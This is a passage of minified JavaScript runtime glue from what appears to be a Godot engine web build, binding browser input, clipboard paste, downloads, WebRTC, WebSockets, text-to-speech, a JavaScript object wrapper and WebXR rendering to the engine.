_godot_js_input_mouse_move_cb(callback){const func=GodotRuntime.get_func(callback),canvas=GodotConfig.canvas;GodotEventListeners.add(window,"mousemove",(function move_cb(evt){const rect=canvas.getBoundingClientRect(),pos=GodotInput.computePosition(evt,rect),rw=canvas.width/rect.width,rh=canvas.height/rect.height,rel_pos_x=evt.movementX*rw,rel_pos_y=evt.movementY*rh,modifiers=GodotInput.getModifiers(evt);func(pos[0],pos[1],rel_pos_x,rel_pos_y,modifiers)}),!1)}function _godot_js_input_mouse_wheel_cb(callback){const func=GodotRuntime.get_func(callback);GodotEventListeners.add(GodotConfig.canvas,"wheel",(function wheel_cb(evt){func(evt.deltaX||0,evt.deltaY||0)&&evt.preventDefault()}),!1)}function _godot_js_input_paste_cb(callback){const func=GodotRuntime.get_func(callback);GodotEventListeners.add(window,"paste",(function(evt){const text=evt.clipboardData.getData("text"),ptr=GodotRuntime.allocString(text);func(ptr),GodotRuntime.free(ptr)}),!1)}function _godot_js_input_touch_cb(callback,ids,coords){const func=GodotRuntime.get_func(callback),canvas=GodotConfig.canvas;function touch_cb(type,evt){0===type&&GodotConfig.canvas.focus();const rect=canvas.getBoundingClientRect(),touches=evt.changedTouches;for(let i=0;i<touches.length;i++){const touch=touches[i],pos=GodotInput.computePosition(touch,rect);GodotRuntime.setHeapValue(coords+2*i*8,pos[0],"double"),GodotRuntime.setHeapValue(coords+8*(2*i+1),pos[1],"double"),GodotRuntime.setHeapValue(ids+4*i,touch.identifier,"i32")}func(type,touches.length),evt.cancelable&&evt.preventDefault()}GodotEventListeners.add(canvas,"touchstart",touch_cb.bind(null,0),!1),GodotEventListeners.add(canvas,"touchend",touch_cb.bind(null,1),!1),GodotEventListeners.add(canvas,"touchcancel",touch_cb.bind(null,1),!1),GodotEventListeners.add(canvas,"touchmove",touch_cb.bind(null,2),!1)}function _godot_js_input_vibrate_handheld(p_duration_ms){"function"!=typeof navigator.vibrate?GodotRuntime.print("This browser does not support vibration."):navigator.vibrate(p_duration_ms)}function _godot_js_os_download_buffer(p_ptr,p_size,p_name,p_mime){const buf=GodotRuntime.heapSlice(GROWABLE_HEAP_I8(),p_ptr,p_size),name=GodotRuntime.parseString(p_name),mime=GodotRuntime.parseString(p_mime),blob=new Blob([buf],{type:mime}),url=window.URL.createObjectURL(blob),a=document.createElement("a");a.href=url,a.download=name,a.style.display="none",document.body.appendChild(a),a.click(),a.remove(),window.URL.revokeObjectURL(url)}function _godot_js_os_execute(p_json){const json_args=GodotRuntime.parseString(p_json),args=JSON.parse(json_args);return GodotConfig.on_execute?(GodotConfig.on_execute(args),0):1}function _godot_js_os_finish_async(p_callback){const func=GodotRuntime.get_func(p_callback);GodotOS.finish_async(func)}function _godot_js_os_fs_is_persistent(){return GodotFS.is_persistent()}function _godot_js_os_fs_sync(callback){const func=GodotRuntime.get_func(callback);GodotOS._fs_sync_promise=GodotFS.sync(),GodotOS._fs_sync_promise.then((function(err){func()}))}function _godot_js_os_has_feature(p_ftr){const ftr=GodotRuntime.parseString(p_ftr),ua=navigator.userAgent;return"web_macos"===ftr?-1!==ua.indexOf("Mac")?1:0:"web_windows"===ftr?-1!==ua.indexOf("Windows")?1:0:"web_android"===ftr?-1!==ua.indexOf("Android")?1:0:"web_ios"===ftr?-1!==ua.indexOf("iPhone")||-1!==ua.indexOf("iPad")||-1!==ua.indexOf("iPod")?1:0:"web_linuxbsd"===ftr&&(-1!==ua.indexOf("CrOS")||-1!==ua.indexOf("BSD")||-1!==ua.indexOf("Linux")||-1!==ua.indexOf("X11"))?1:0}function _godot_js_os_hw_concurrency_get(){const concurrency=navigator.hardwareConcurrency||1;return concurrency<2?concurrency:2}function _godot_js_os_request_quit_cb(p_callback){GodotOS.request_quit=GodotRuntime.get_func(p_callback)}function _godot_js_os_shell_open(p_uri){window.open(GodotRuntime.parseString(p_uri),"_blank")}var GodotPWA={hasUpdate:!1,updateState:function(cb,reg){reg&&reg.active&&(reg.waiting&&(GodotPWA.hasUpdate=!0,cb()),GodotEventListeners.add(reg,"updatefound",(function(){const installing=reg.installing;GodotEventListeners.add(installing,"statechange",(function(){"installed"===installing.state&&(GodotPWA.hasUpdate=!0,cb())}))})))}};function _godot_js_pwa_cb(p_update_cb){if("serviceWorker"in navigator){const cb=GodotRuntime.get_func(p_update_cb);navigator.serviceWorker.getRegistration().then(GodotPWA.updateState.bind(null,cb))}}function _godot_js_pwa_update(){return"serviceWorker"in navigator&&GodotPWA.hasUpdate?(navigator.serviceWorker.getRegistration().then((function(reg){reg&&reg.waiting&&reg.waiting.postMessage("update")})),0):1}var GodotRTCDataChannel={connect:function(p_id,p_on_open,p_on_message,p_on_error,p_on_close){const ref=IDHandler.get(p_id);ref&&(ref.binaryType="arraybuffer",ref.onopen=function(event){p_on_open()},ref.onclose=function(event){p_on_close()},ref.onerror=function(event){p_on_error()},ref.onmessage=function(event){let buffer,is_string=0;if(event.data instanceof ArrayBuffer)buffer=new Uint8Array(event.data);else{if(event.data instanceof Blob)return void GodotRuntime.error("Blob type not supported");if("string"!=typeof event.data)return void GodotRuntime.error("Unknown message type");{is_string=1;const enc=new TextEncoder("utf-8");buffer=new Uint8Array(enc.encode(event.data))}}const len=buffer.length*buffer.BYTES_PER_ELEMENT,out=GodotRuntime.malloc(len);GROWABLE_HEAP_U8().set(buffer,out),p_on_message(out,len,is_string),GodotRuntime.free(out)})},close:function(p_id){const ref=IDHandler.get(p_id);ref&&(ref.onopen=null,ref.onmessage=null,ref.onerror=null,ref.onclose=null,ref.close())},get_prop:function(p_id,p_prop,p_def){const ref=IDHandler.get(p_id);return ref&&void 0!==ref[p_prop]?ref[p_prop]:p_def}};function _godot_js_rtc_datachannel_close(p_id){IDHandler.get(p_id)&&GodotRTCDataChannel.close(p_id)}function _godot_js_rtc_datachannel_connect(p_id,p_ref,p_on_open,p_on_message,p_on_error,p_on_close){const onopen=GodotRuntime.get_func(p_on_open).bind(null,p_ref),onmessage=GodotRuntime.get_func(p_on_message).bind(null,p_ref),onerror=GodotRuntime.get_func(p_on_error).bind(null,p_ref),onclose=GodotRuntime.get_func(p_on_close).bind(null,p_ref);GodotRTCDataChannel.connect(p_id,onopen,onmessage,onerror,onclose)}function _godot_js_rtc_datachannel_destroy(p_id){GodotRTCDataChannel.close(p_id),IDHandler.remove(p_id)}function _godot_js_rtc_datachannel_get_buffered_amount(p_id){return GodotRTCDataChannel.get_prop(p_id,"bufferedAmount",0)}function _godot_js_rtc_datachannel_id_get(p_id){return GodotRTCDataChannel.get_prop(p_id,"id",65535)}function _godot_js_rtc_datachannel_is_negotiated(p_id){return GodotRTCDataChannel.get_prop(p_id,"negotiated",65535)}function _godot_js_rtc_datachannel_is_ordered(p_id){return GodotRTCDataChannel.get_prop(p_id,"ordered",!0)}function _godot_js_rtc_datachannel_label_get(p_id){const ref=IDHandler.get(p_id);return ref&&ref.label?GodotRuntime.allocString(ref.label):0}function _godot_js_rtc_datachannel_max_packet_lifetime_get(p_id){const ref=IDHandler.get(p_id);return ref?void 0!==ref.maxPacketLifeTime?ref.maxPacketLifeTime:void 0!==ref.maxRetransmitTime?ref.maxRetransmitTime:65535:65535}function _godot_js_rtc_datachannel_max_retransmits_get(p_id){return GodotRTCDataChannel.get_prop(p_id,"maxRetransmits",65535)}function _godot_js_rtc_datachannel_protocol_get(p_id){const ref=IDHandler.get(p_id);return ref&&ref.protocol?GodotRuntime.allocString(ref.protocol):0}function _godot_js_rtc_datachannel_ready_state_get(p_id){const ref=IDHandler.get(p_id);if(!ref)return 3;switch(ref.readyState){case"connecting":return 0;case"open":return 1;case"closing":return 2;default:return 3}}function _godot_js_rtc_datachannel_send(p_id,p_buffer,p_length,p_raw){const ref=IDHandler.get(p_id);if(!ref)return 1;const bytes_array=new Uint8Array(p_length);for(let i=0;i<p_length;i++)bytes_array[i]=GodotRuntime.getHeapValue(p_buffer+i,"i8");if(p_raw)ref.send(bytes_array.buffer);else{const string=new TextDecoder("utf-8").decode(bytes_array);ref.send(string)}return 0}var GodotRTCPeerConnection={ConnectionState:{new:0,connecting:1,connected:2,disconnected:3,failed:4,closed:5},ConnectionStateCompat:{new:0,checking:1,connected:2,completed:2,disconnected:3,failed:4,closed:5},IceGatheringState:{new:0,gathering:1,complete:2},SignalingState:{stable:0,"have-local-offer":1,"have-remote-offer":2,"have-local-pranswer":3,"have-remote-pranswer":4,closed:5},create:function(config,onConnectionChange,onSignalingChange,onIceGatheringChange,onIceCandidate,onDataChannel){let conn=null;try{conn=new RTCPeerConnection(config)}catch(e){return GodotRuntime.error(e),0}const id=IDHandler.add(conn);return"connectionState"in conn&&void 0!==conn.connectionState?conn.onconnectionstatechange=function(event){IDHandler.get(id)&&onConnectionChange(GodotRTCPeerConnection.ConnectionState[conn.connectionState]||0)}:conn.oniceconnectionstatechange=function(event){IDHandler.get(id)&&onConnectionChange(GodotRTCPeerConnection.ConnectionStateCompat[conn.iceConnectionState]||0)},conn.onicegatheringstatechange=function(event){IDHandler.get(id)&&onIceGatheringChange(GodotRTCPeerConnection.IceGatheringState[conn.iceGatheringState]||0)},conn.onsignalingstatechange=function(event){IDHandler.get(id)&&onSignalingChange(GodotRTCPeerConnection.SignalingState[conn.signalingState]||0)},conn.onicecandidate=function(event){if(!IDHandler.get(id))return;const c=event.candidate;if(!c||!c.candidate)return;const candidate_str=GodotRuntime.allocString(c.candidate),mid_str=GodotRuntime.allocString(c.sdpMid);onIceCandidate(mid_str,c.sdpMLineIndex,candidate_str),GodotRuntime.free(candidate_str),GodotRuntime.free(mid_str)},conn.ondatachannel=function(event){if(!IDHandler.get(id))return;const cid=IDHandler.add(event.channel);onDataChannel(cid)},id},destroy:function(p_id){const conn=IDHandler.get(p_id);conn&&(conn.onconnectionstatechange=null,conn.oniceconnectionstatechange=null,conn.onicegatheringstatechange=null,conn.onsignalingstatechange=null,conn.onicecandidate=null,conn.ondatachannel=null,IDHandler.remove(p_id))},onsession:function(p_id,callback,session){if(!IDHandler.get(p_id))return;const type_str=GodotRuntime.allocString(session.type),sdp_str=GodotRuntime.allocString(session.sdp);callback(type_str,sdp_str),GodotRuntime.free(type_str),GodotRuntime.free(sdp_str)},onerror:function(p_id,callback,error){IDHandler.get(p_id)&&(GodotRuntime.error(error),callback())}};function _godot_js_rtc_pc_close(p_id){const ref=IDHandler.get(p_id);ref&&ref.close()}function _godot_js_rtc_pc_create(p_config,p_ref,p_on_connection_state_change,p_on_ice_gathering_state_change,p_on_signaling_state_change,p_on_ice_candidate,p_on_datachannel){const wrap=function(p_func){return GodotRuntime.get_func(p_func).bind(null,p_ref)};return GodotRTCPeerConnection.create(JSON.parse(GodotRuntime.parseString(p_config)),wrap(p_on_connection_state_change),wrap(p_on_signaling_state_change),wrap(p_on_ice_gathering_state_change),wrap(p_on_ice_candidate),wrap(p_on_datachannel))}function _godot_js_rtc_pc_datachannel_create(p_id,p_label,p_config){try{const ref=IDHandler.get(p_id);if(!ref)return 0;const label=GodotRuntime.parseString(p_label),config=JSON.parse(GodotRuntime.parseString(p_config)),channel=ref.createDataChannel(label,config);return IDHandler.add(channel)}catch(e){return GodotRuntime.error(e),0}}function _godot_js_rtc_pc_destroy(p_id){GodotRTCPeerConnection.destroy(p_id)}function _godot_js_rtc_pc_ice_candidate_add(p_id,p_mid_name,p_mline_idx,p_sdp){const ref=IDHandler.get(p_id);if(!ref)return;const sdpMidName=GodotRuntime.parseString(p_mid_name),sdpName=GodotRuntime.parseString(p_sdp);ref.addIceCandidate(new RTCIceCandidate({candidate:sdpName,sdpMid:sdpMidName,sdpMlineIndex:p_mline_idx}))}function _godot_js_rtc_pc_local_description_set(p_id,p_type,p_sdp,p_obj,p_on_error){const ref=IDHandler.get(p_id);if(!ref)return;const type=GodotRuntime.parseString(p_type),sdp=GodotRuntime.parseString(p_sdp),onerror=GodotRuntime.get_func(p_on_error).bind(null,p_obj);ref.setLocalDescription({sdp:sdp,type:type}).catch((function(error){GodotRTCPeerConnection.onerror(p_id,onerror,error)}))}function _godot_js_rtc_pc_offer_create(p_id,p_obj,p_on_session,p_on_error){const ref=IDHandler.get(p_id);if(!ref)return;const onsession=GodotRuntime.get_func(p_on_session).bind(null,p_obj),onerror=GodotRuntime.get_func(p_on_error).bind(null,p_obj);ref.createOffer().then((function(session){GodotRTCPeerConnection.onsession(p_id,onsession,session)})).catch((function(error){GodotRTCPeerConnection.onerror(p_id,onerror,error)}))}function _godot_js_rtc_pc_remote_description_set(p_id,p_type,p_sdp,p_obj,p_session_created,p_on_error){const ref=IDHandler.get(p_id);if(!ref)return;const type=GodotRuntime.parseString(p_type),sdp=GodotRuntime.parseString(p_sdp),onerror=GodotRuntime.get_func(p_on_error).bind(null,p_obj),onsession=GodotRuntime.get_func(p_session_created).bind(null,p_obj);ref.setRemoteDescription({sdp:sdp,type:type}).then((function(){return"offer"!==type?Promise.resolve():ref.createAnswer().then((function(session){GodotRTCPeerConnection.onsession(p_id,onsession,session)}))})).catch((function(error){GodotRTCPeerConnection.onerror(p_id,onerror,error)}))}function _godot_js_tts_get_voices(p_callback){const func=GodotRuntime.get_func(p_callback);try{const arr=[],voices=window.speechSynthesis.getVoices();for(let i=0;i<voices.length;i++)arr.push(`${voices[i].lang};${voices[i].name}`);const c_ptr=GodotRuntime.allocStringArray(arr);func(arr.length,c_ptr),GodotRuntime.freeStringArray(c_ptr,arr.length)}catch(e){}}function _godot_js_tts_is_paused(){return window.speechSynthesis.paused}function _godot_js_tts_is_speaking(){return window.speechSynthesis.speaking}function _godot_js_tts_pause(){window.speechSynthesis.pause()}function _godot_js_tts_resume(){window.speechSynthesis.resume()}function _godot_js_tts_speak(p_text,p_voice,p_volume,p_pitch,p_rate,p_utterance_id,p_callback){const func=GodotRuntime.get_func(p_callback);const utterance=new SpeechSynthesisUtterance(GodotRuntime.parseString(p_text));utterance.rate=p_rate,utterance.pitch=p_pitch,utterance.volume=p_volume/100,utterance.addEventListener("end",(function listener_end(evt){evt.currentTarget.cb(1,evt.currentTarget.id,0)})),utterance.addEventListener("start",(function listener_start(evt){evt.currentTarget.cb(0,evt.currentTarget.id,0)})),utterance.addEventListener("error",(function listener_error(evt){evt.currentTarget.cb(2,evt.currentTarget.id,0)})),utterance.addEventListener("boundary",(function listener_bound(evt){evt.currentTarget.cb(3,evt.currentTarget.id,evt.charIndex)})),utterance.id=p_utterance_id,utterance.cb=func;const voice=GodotRuntime.parseString(p_voice),voices=window.speechSynthesis.getVoices();for(let i=0;i<voices.length;i++)if(voices[i].name===voice){utterance.voice=voices[i];break}window.speechSynthesis.resume(),window.speechSynthesis.speak(utterance)}function _godot_js_tts_stop(){window.speechSynthesis.cancel(),window.speechSynthesis.resume()}var GodotWebSocket={_onopen:function(p_id,callback,event){const ref=IDHandler.get(p_id);if(!ref)return;const c_str=GodotRuntime.allocString(ref.protocol);callback(c_str),GodotRuntime.free(c_str)},_onmessage:function(p_id,callback,event){if(!IDHandler.get(p_id))return;let buffer,is_string=0;if(event.data instanceof ArrayBuffer)buffer=new Uint8Array(event.data);else{if(event.data instanceof Blob)return void GodotRuntime.error("Blob type not supported");if("string"!=typeof event.data)return void GodotRuntime.error("Unknown message type");{is_string=1;const enc=new TextEncoder("utf-8");buffer=new Uint8Array(enc.encode(event.data))}}const len=buffer.length*buffer.BYTES_PER_ELEMENT,out=GodotRuntime.malloc(len);GROWABLE_HEAP_U8().set(buffer,out),callback(out,len,is_string),GodotRuntime.free(out)},_onerror:function(p_id,callback,event){IDHandler.get(p_id)&&callback()},_onclose:function(p_id,callback,event){if(!IDHandler.get(p_id))return;const c_str=GodotRuntime.allocString(event.reason);callback(event.code,c_str,event.wasClean?1:0),GodotRuntime.free(c_str)},send:function(p_id,p_data){const ref=IDHandler.get(p_id);return ref&&ref.readyState===ref.OPEN?(ref.send(p_data),0):1},bufferedAmount:function(p_id){const ref=IDHandler.get(p_id);return ref?ref.bufferedAmount:0},create:function(socket,p_on_open,p_on_message,p_on_error,p_on_close){const id=IDHandler.add(socket);return socket.onopen=GodotWebSocket._onopen.bind(null,id,p_on_open),socket.onmessage=GodotWebSocket._onmessage.bind(null,id,p_on_message),socket.onerror=GodotWebSocket._onerror.bind(null,id,p_on_error),socket.onclose=GodotWebSocket._onclose.bind(null,id,p_on_close),id},close:function(p_id,p_code,p_reason){const ref=IDHandler.get(p_id);if(ref&&ref.readyState<ref.CLOSING){const code=p_code,reason=GodotRuntime.parseString(p_reason);ref.close(code,reason)}},destroy:function(p_id){const ref=IDHandler.get(p_id);ref&&(GodotWebSocket.close(p_id,3001,"destroyed"),IDHandler.remove(p_id),ref.onopen=null,ref.onmessage=null,ref.onerror=null,ref.onclose=null)}};function _godot_js_websocket_buffered_amount(p_id){return GodotWebSocket.bufferedAmount(p_id)}function _godot_js_websocket_close(p_id,p_code,p_reason){const code=p_code,reason=GodotRuntime.parseString(p_reason);GodotWebSocket.close(p_id,code,reason)}function _godot_js_websocket_create(p_ref,p_url,p_proto,p_on_open,p_on_message,p_on_error,p_on_close){const on_open=GodotRuntime.get_func(p_on_open).bind(null,p_ref),on_message=GodotRuntime.get_func(p_on_message).bind(null,p_ref),on_error=GodotRuntime.get_func(p_on_error).bind(null,p_ref),on_close=GodotRuntime.get_func(p_on_close).bind(null,p_ref),url=GodotRuntime.parseString(p_url),protos=GodotRuntime.parseString(p_proto);let socket=null;try{socket=protos?new WebSocket(url,protos.split(",")):new WebSocket(url)}catch(e){return 0}return socket.binaryType="arraybuffer",GodotWebSocket.create(socket,on_open,on_message,on_error,on_close)}function _godot_js_websocket_destroy(p_id){GodotWebSocket.destroy(p_id)}function _godot_js_websocket_send(p_id,p_buf,p_buf_len,p_raw){const bytes_array=new Uint8Array(p_buf_len);let i=0;for(i=0;i<p_buf_len;i++)bytes_array[i]=GodotRuntime.getHeapValue(p_buf+i,"i8");let out=bytes_array.buffer;return p_raw||(out=new TextDecoder("utf-8").decode(bytes_array)),GodotWebSocket.send(p_id,out)}var GodotJSWrapper={proxies:null,cb_ret:null,MyProxy:function(val){const id=IDHandler.add(this);GodotJSWrapper.proxies.set(val,id);let refs=1;this.ref=function(){refs++},this.unref=function(){refs--,0===refs&&(IDHandler.remove(id),GodotJSWrapper.proxies.delete(val))},this.get_val=function(){return val},this.get_id=function(){return id}},get_proxied:function(val){const id=GodotJSWrapper.proxies.get(val);if(void 0===id){return new GodotJSWrapper.MyProxy(val).get_id()}return IDHandler.get(id).ref(),id},get_proxied_value:function(id){const proxy=IDHandler.get(id);if(void 0!==proxy)return proxy.get_val()},variant2js:function(type,val){switch(type){case 0:return null;case 1:return!!GodotRuntime.getHeapValue(val,"i64");case 2:return GodotRuntime.getHeapValue(val,"i64");case 3:return GodotRuntime.getHeapValue(val,"double");case 4:return GodotRuntime.parseString(GodotRuntime.getHeapValue(val,"*"));case 24:return GodotJSWrapper.get_proxied_value(GodotRuntime.getHeapValue(val,"i64"));default:return}},js2variant:function(p_val,p_exchange){if(null==p_val)return 0;const type=typeof p_val;if("boolean"===type)return GodotRuntime.setHeapValue(p_exchange,p_val,"i64"),1;if("number"===type)return Number.isInteger(p_val)?(GodotRuntime.setHeapValue(p_exchange,p_val,"i64"),2):(GodotRuntime.setHeapValue(p_exchange,p_val,"double"),3);if("string"===type){const c_str=GodotRuntime.allocString(p_val);return GodotRuntime.setHeapValue(p_exchange,c_str,"*"),4}const id=GodotJSWrapper.get_proxied(p_val);return GodotRuntime.setHeapValue(p_exchange,id,"i64"),24}};function _godot_js_wrapper_create_cb(p_ref,p_func){const func=GodotRuntime.get_func(p_func);let id=0;return id=GodotJSWrapper.get_proxied((function(){if(!GodotJSWrapper.get_proxied_value(id))return;GodotJSWrapper.cb_ret=null;const args=Array.from(arguments);func(p_ref,GodotJSWrapper.get_proxied(args),args.length);const ret=GodotJSWrapper.cb_ret;return GodotJSWrapper.cb_ret=null,ret})),id}function _godot_js_wrapper_create_object(p_object,p_args,p_argc,p_convert_callback,p_exchange,p_lock,p_free_lock_callback){const name=GodotRuntime.parseString(p_object);if(void 0===window[name])return-1;const convert=GodotRuntime.get_func(p_convert_callback),freeLock=GodotRuntime.get_func(p_free_lock_callback),args=new Array(p_argc);for(let i=0;i<p_argc;i++){const type=convert(p_args,i,p_exchange,p_lock),lock=GodotRuntime.getHeapValue(p_lock,"*");args[i]=GodotJSWrapper.variant2js(type,p_exchange),lock&&freeLock(p_lock,type)}try{const res=new window[name](...args);return GodotJSWrapper.js2variant(res,p_exchange)}catch(e){return GodotRuntime.error(`Error calling constructor ${name} with args:`,args,"error:",e),-1}}function _godot_js_wrapper_interface_get(p_name){const name=GodotRuntime.parseString(p_name);return void 0!==window[name]?GodotJSWrapper.get_proxied(window[name]):0}function _godot_js_wrapper_object_call(p_id,p_method,p_args,p_argc,p_convert_callback,p_exchange,p_lock,p_free_lock_callback){const obj=GodotJSWrapper.get_proxied_value(p_id);if(void 0===obj)return-1;const method=GodotRuntime.parseString(p_method),convert=GodotRuntime.get_func(p_convert_callback),freeLock=GodotRuntime.get_func(p_free_lock_callback),args=new Array(p_argc);for(let i=0;i<p_argc;i++){const type=convert(p_args,i,p_exchange,p_lock),lock=GodotRuntime.getHeapValue(p_lock,"*");args[i]=GodotJSWrapper.variant2js(type,p_exchange),lock&&freeLock(p_lock,type)}try{const res=obj[method](...args);return GodotJSWrapper.js2variant(res,p_exchange)}catch(e){return GodotRuntime.error(`Error calling method ${method} on:`,obj,"error:",e),-1}}function _godot_js_wrapper_object_get(p_id,p_exchange,p_prop){const obj=GodotJSWrapper.get_proxied_value(p_id);if(void 0===obj)return 0;if(p_prop){const prop=GodotRuntime.parseString(p_prop);try{return GodotJSWrapper.js2variant(obj[prop],p_exchange)}catch(e){return GodotRuntime.error(`Error getting variable ${prop} on object`,obj),0}}return GodotJSWrapper.js2variant(obj,p_exchange)}function _godot_js_wrapper_object_getvar(p_id,p_type,p_exchange){const obj=GodotJSWrapper.get_proxied_value(p_id);if(void 0===obj)return-1;const prop=GodotJSWrapper.variant2js(p_type,p_exchange);if(null==prop)return-1;try{return GodotJSWrapper.js2variant(obj[prop],p_exchange)}catch(e){return GodotRuntime.error(`Error getting variable ${prop} on object`,obj,e),-1}}function _godot_js_wrapper_object_set(p_id,p_name,p_type,p_exchange){const obj=GodotJSWrapper.get_proxied_value(p_id);if(void 0===obj)return;const name=GodotRuntime.parseString(p_name);try{obj[name]=GodotJSWrapper.variant2js(p_type,p_exchange)}catch(e){GodotRuntime.error(`Error setting variable ${name} on object`,obj)}}function _godot_js_wrapper_object_set_cb_ret(p_val_type,p_val_ex){GodotJSWrapper.cb_ret=GodotJSWrapper.variant2js(p_val_type,p_val_ex)}function _godot_js_wrapper_object_setvar(p_id,p_key_type,p_key_ex,p_val_type,p_val_ex){const obj=GodotJSWrapper.get_proxied_value(p_id);if(void 0===obj)return-1;const key=GodotJSWrapper.variant2js(p_key_type,p_key_ex);try{return obj[key]=GodotJSWrapper.variant2js(p_val_type,p_val_ex),0}catch(e){return GodotRuntime.error(`Error setting variable ${key} on object`,obj),-1}}function _godot_js_wrapper_object_unref(p_id){const proxy=IDHandler.get(p_id);void 0!==proxy&&proxy.unref()}var GodotWebGL2={};function _godot_webgl2_glFramebufferTextureMultiviewOVR(target,attachment,texture,level,base_view_index,num_views){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(52,1,target,attachment,texture,level,base_view_index,num_views);const context=GL.currentContext;if(void 0===context.multiviewExt){const ext=context.GLctx.getExtension("OVR_multiview2");if(!ext)return void console.error("Trying to call glFramebufferTextureMultiviewOVR() without the OVR_multiview2 extension");context.multiviewExt=ext}context.multiviewExt.framebufferTextureMultiviewOVR(target,attachment,GL.textures[texture],level,base_view_index,num_views)}var GodotWebXR={gl:null,session:null,gl_binding:null,layer:null,space:null,frame:null,pose:null,view_count:1,input_sources:[,,,,,,,,,,,,,,,],touches:[,,,,],onsimpleevent:null,orig_requestAnimationFrame:null,requestAnimationFrame:callback=>{if(GodotWebXR.session&&GodotWebXR.space){const onFrame=function(time,frame){GodotWebXR.frame=frame,GodotWebXR.pose=frame.getViewerPose(GodotWebXR.space),callback(time),GodotWebXR.frame=null,GodotWebXR.pose=null};GodotWebXR.session.requestAnimationFrame(onFrame)}else GodotWebXR.orig_requestAnimationFrame(callback)},monkeyPatchRequestAnimationFrame:enable=>{null===GodotWebXR.orig_requestAnimationFrame&&(GodotWebXR.orig_requestAnimationFrame=Browser.requestAnimationFrame),Browser.requestAnimationFrame=enable?GodotWebXR.requestAnimationFrame:GodotWebXR.orig_requestAnimationFrame},pauseResumeMainLoop:()=>{Browser.mainLoop.pause(),runtimeKeepalivePush(),window.setTimeout((function(){runtimeKeepalivePop(),Browser.mainLoop.resume()}),0)},getLayer:()=>{const new_view_count=GodotWebXR.pose?GodotWebXR.pose.views.length:1;let layer=GodotWebXR.layer;if(layer&&GodotWebXR.view_count===new_view_count)return layer;if(!GodotWebXR.session||!GodotWebXR.gl_binding)return null;const gl=GodotWebXR.gl;return layer=GodotWebXR.gl_binding.createProjectionLayer({textureType:new_view_count>1?"texture-array":"texture",colorFormat:gl.RGBA8,depthFormat:gl.DEPTH_COMPONENT24}),GodotWebXR.session.updateRenderState({layers:[layer]}),GodotWebXR.layer=layer,GodotWebXR.view_count=new_view_count,layer},getSubImage:()=>{if(!GodotWebXR.pose)return null;const layer=GodotWebXR.getLayer();return null===layer?null:GodotWebXR.gl_binding.getViewSubImage(layer,GodotWebXR.pose.views[0])},getTextureId:texture=>{if(void 0!==texture.name)return texture.name;const id=GL.getNewId(GL.textures);return texture.name=id,GL.textures[id]=texture,id},addInputSource:input_source=>{let name=-1;if("tracked-pointer"===input_source.targetRayMode&&"left"===input_source.handedness)name=0;else if("tracked-pointer"===input_source.targetRayMode&&"right"===input_source.handedness)name=1;else for(let i=2;i<16;i++)if(!GodotWebXR.input_sources[i]){name=i;break}if(name>=0&&(GodotWebXR.input_sources[name]=input_source,input_source.name=name,"screen"===input_source.targetRayMode)){let touch_index=-1;for(let i=0;i<5;i++)if(!GodotWebXR.touches[i]){touch_index=i;break}touch_index>=0&&(GodotWebXR.touches[touch_index]=input_source,input_source.touch_index=touch_index)}return name},removeInputSource:input_source=>{if(void 0!==input_source.name){const name=input_source.name;if(name>=0&&name<16&&(GodotWebXR.input_sources[name]=null),void 0!==input_source.touch_index){const touch_index=input_source.touch_index;touch_index>=0&&touch_index<5&&(GodotWebXR.touches[touch_index]=null)}return name}return-1},getInputSourceId:input_source=>void 0!==input_source?input_source.name:-1,getTouchIndex:input_source=>void 0!==input_source.touch_index?input_source.touch_index:-1};function _godot_webxr_get_bounds_geometry(r_points){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(53,1,r_points);if(!GodotWebXR.space||!GodotWebXR.space.boundsGeometry)return 0;const point_count=GodotWebXR.space.boundsGeometry.length;if(0===point_count)return 0;const buf=GodotRuntime.malloc(3*point_count*4);for(let i=0;i<point_count;i++){const point=GodotWebXR.space.boundsGeometry[i];GodotRuntime.setHeapValue(buf+4*(3*i+0),point.x,"float"),GodotRuntime.setHeapValue(buf+4*(3*i+1),point.y,"float"),GodotRuntime.setHeapValue(buf+4*(3*i+2),point.z,"float")}return GodotRuntime.setHeapValue(r_points,buf,"i32"),point_count}function _godot_webxr_get_color_texture(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(54,1);const subimage=GodotWebXR.getSubImage();return null===subimage?0:GodotWebXR.getTextureId(subimage.colorTexture)}function _godot_webxr_get_depth_texture(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(55,1);const subimage=GodotWebXR.getSubImage();return null===subimage?0:subimage.depthStencilTexture?GodotWebXR.getTextureId(subimage.depthStencilTexture):0}function _godot_webxr_get_frame_rate(){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(56,1):GodotWebXR.session&&void 0!==GodotWebXR.session.frameRate?GodotWebXR.session.frameRate:0}function _godot_webxr_get_projection_for_view(p_view,r_transform){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(57,1,p_view,r_transform);if(!GodotWebXR.session||!GodotWebXR.pose)return!1;const matrix=GodotWebXR.pose.views[p_view].projectionMatrix;for(let i=0;i<16;i++)GodotRuntime.setHeapValue(r_transform+4*i,matrix[i],"float");return!0}function _godot_webxr_get_render_target_size(r_size){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(58,1,r_size);const subimage=GodotWebXR.getSubImage();return null!==subimage&&(GodotRuntime.setHeapValue(r_size+0,subimage.viewport.width,"i32"),GodotRuntime.setHeapValue(r_size+4,subimage.viewport.height,"i32"),!0)}function _godot_webxr_get_supported_frame_rates(r_frame_rates){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(59,1,r_frame_rates);if(!GodotWebXR.session||void 0===GodotWebXR.session.supportedFrameRates)return 0;const frame_rate_count=GodotWebXR.session.supportedFrameRates.length;if(0===frame_rate_count)return 0;const buf=GodotRuntime.malloc(4*frame_rate_count);for(let i=0;i<frame_rate_count;i++)GodotRuntime.setHeapValue(buf+4*i,GodotWebXR.session.supportedFrameRates[i],"float");return GodotRuntime.setHeapValue(r_frame_rates,buf,"i32"),frame_rate_count}function _godot_webxr_get_transform_for_view(p_view,r_transform){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(60,1,p_view,r_transform);if(!GodotWebXR.session||!GodotWebXR.pose)return!1;const views=GodotWebXR.pose.views;let matrix;matrix=p_view>=0?views[p_view].transform.matrix:GodotWebXR.pose.transform.matrix;for(let 